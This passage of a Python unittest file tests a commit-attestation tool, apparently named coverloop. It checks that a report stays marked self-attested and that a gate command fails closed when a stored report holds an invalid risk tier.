        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.json")) as f:
            rep2 = json.load(f)
        self.assertEqual(rep2["codex"]["source"], "self-attested")  # dropped, not copied
        self.assertFalse(os.path.exists(
            os.path.join(self.repo, ".coverloop", "reports", f"{sha2}.codex.log")))

    def test_invalid_report_tier_fails_closed(self):
        """Codex v2.7 review: a garbage risk_tier must fail closed, not be
        ignored by tier_max and gated as the pinned --min-tier."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["risk_tier"] = "L9"
        with open(p, "w") as f:
            json.dump(rep, f)
        self.assertEqual(run(["gate", "--min-tier", "L0"], self.repo).returncode, 1)
        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)


if __name__ == "__main__":
    unittest.main()
